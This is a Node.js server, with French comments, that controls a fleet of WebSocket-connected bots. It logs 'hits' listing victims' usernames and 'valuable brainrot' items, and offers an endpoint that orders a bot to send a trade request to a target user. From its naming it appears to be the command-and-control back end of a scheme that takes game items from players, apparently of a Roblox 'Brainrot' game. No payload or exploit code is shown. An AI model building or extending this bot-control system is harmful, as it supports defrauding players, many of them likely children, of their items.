const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Configuration & Connexion DB
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);

mongoose.connect(MONGO_URI)
  .then(() => log("✅ [DB] Connexion établie"))
  .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// --- MODÈLES ---
const hitSchema = new mongoose.Schema({
    timestamp: { type: Date, default: Date.now },
    displayName: String,
    username: String,
    receivers: [String], // Les bots qui ont participé
    valuableBrainrots: [String] // Liste des items précieux
});
const Hit = mongoose.model('Hit', hitSchema);

const logSchema = new mongoose.Schema({
    username: String,
    type: String,
    message: String,
    timestamp: { type: Date, default: Date.now }
});
const BotLog = mongoose.model('BotLog', logSchema);

const activeBots = new Map();

// --- MIDDLEWARE DE SÉCURITÉ ---
const authAdmin = (req, res, next) => {
    const token = req.query.token;
    if (token && token === ADMIN_TOKEN) {
        next();
    } else {
        res.status(403).json({ error: "Accès refusé : Token invalide" });
    }
};

// --- ROUTES API ---

app.get('/api/admin/verify', (req, res) => {
    if (req.query.token === ADMIN_TOKEN) {
        res.json({ success: true });
    } else {
        res.status(403).json({ success: false });
    }
});

app.get('/api/admin/bots', authAdmin, (req, res) => {
    const names = Array.from(activeBots.keys());
    res.json(names);
});

app.get('/api/logs', authAdmin, async (req, res) => {
    try {
        const logs = await BotLog.find().sort({ timestamp: -1 }).limit(50);
        res.json(logs);
    } catch (e) { res.status(500).send(e.message); }
});

app.get('/api/logs/clear', authAdmin, async (req, res) => {
    try {
        await BotLog.deleteMany({});
        res.send("🗑️ Tous les logs ont été effacés.");
    } catch (e) { res.status(500).send(e.message); }
});

// Route pour récupérer les hits (pour l'admin)
app.get('/api/admin/hits', authAdmin, async (req, res) => {
    try {
        const hits = await Hit.find().sort({ timestamp: -1 }).limit(50);
        res.json(hits);
    } catch (e) { res.status(500).send(e.message); }
});

app.get('/ping', (req, res) => res.send("Pong !"));

// --- GESTION DES TRADES AVEC RETRY (C# COMPATIBLE) ---
app.get('/api/sendtrade', async (req, res) => {
    const { receiver, target } = req.query;
    
    if (!receiver || !target) return res.status(400).send("Paramètres manquants.");

    log(`📡 Tentative d'ordre vers ${receiver} (Cible: ${target})`);

    let attempts = 0;
    const maxAttempts = 5; // On essaie 5 fois
    const delay = 2000;    // Toutes les 2 secondes (Total 10s)

    while (attempts < maxAttempts) {
        const botWs = activeBots.get(receiver);

        if (botWs && botWs.readyState === WebSocket.OPEN) {
            botWs.send(JSON.stringify({ Type: "TradeRequest", TargetUser: target }));
            log(`[SUCCESS] Ordre envoyé à ${receiver} après ${attempts} retry.`);
            return res.send(`Ordre envoyé à ${receiver}`);
        }

        attempts++;
        if (attempts < maxAttempts) {
            log(`[RETRY ${attempts}/${maxAttempts}] Bot ${receiver} non trouvé. Attente...`);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    log(`[FAIL] Bot ${receiver} définitivement hors ligne.`);
    res.send(`Bot ${receiver} hors ligne.`);
});

// --- GESTION WEBSOCKET (CLEANUP INCLUS) ---
wss.on('connection', async (ws, req) => {
    const parameters = url.parse(req.url, true).query;
    const username = parameters.username || "Unknown";

    // Gestion des doublons : si le bot existe déjà, on déconnecte l'ancien
    if (activeBots.has(username)) {
        log(`[CLEANUP] Fermeture de l'ancienne session pour : ${username}`);
        const oldWs = activeBots.get(username);
        oldWs.terminate(); // Coupe immédiatement
    }

    activeBots.set(username, ws);
    log(`🤖 Bot connecté : ${username}`);

    ws.on('message', async (msg) => {
        try {
            const payload = JSON.parse(msg);
            if (payload.Method === "Log") {
                const newLog = new BotLog({
                    username: username,
                    type: payload.Type || "Info",
                    message: payload.Message || "Aucun message"
                });
                await newLog.save();
                log(`[LOG BOT] ${username}: ${payload.Message}`);
            }
        } catch (e) { log(`⚠️ Erreur WS: ${e.message}`); }
    });

    ws.on('close', () => {
        // On ne supprime que si c'est bien la session actuelle
        if (activeBots.get(username) === ws) {
            activeBots.delete(username);
            log(`💀 Bot déconnecté : ${username}`);
        }
    });

    ws.on('error', (err) => {
        log(`❌ Erreur sur le bot ${username}: ${err.message}`);
    });
});

// --- LANCEMENT ---
app.use(express.static('public'));
server.listen(PORT, () => log(`🚀 Serveur PRO Rusteez actif sur le port ${PORT}`));
